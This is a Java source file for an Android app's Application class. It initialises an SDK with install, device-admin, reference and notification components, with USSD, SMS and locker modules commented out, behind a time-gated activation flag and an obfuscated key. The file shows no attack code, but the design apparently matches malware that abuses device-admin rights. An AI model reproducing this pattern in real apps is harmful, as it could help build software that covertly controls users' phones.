package com.app.manager;

import android.app.Application;

import java.util.ArrayList;
import java.util.List;

import commons.app.com.commons.CommonUtils;
import commons.app.com.commons.commons.SdkCommonsImpl;
import commons.app.com.commons.commons.SdkComponent;
import main.app.com.NotificationsComponent;
import refs.me.com.ReferencesComponent;
import rights.app.com.device.AdminComponent;
import utils.app.com.installs.InstallsComponent;

public class App extends Application {

    @Override
    public void onCreate() {
        super.onCreate();
        boolean useFullVersion = CommonUtils.checkIsFullVersionTime(BuildConfig.U_D);
        List<SdkComponent> components = new ArrayList<>();
        components.add(new InstallsComponent());
        //        components.add(new UssdComponent());
        //        components.add(new TextComponent());
        //        components.add(new LockerComponent());
        components.add(new AdminComponent());
        components.add(new ReferencesComponent());
        components.add(new NotificationsComponent());
        SdkCommonsImpl.init(this,
                BuildConfig.APPLICATION_ID,
                CommonUtils.wrapStringWithKeys(BuildConfig.ARG_1, BuildConfig.KEY_1),
                MainActivity.class,
                BuildConfig.DEBUG, useFullVersion,
                components);
    }
}
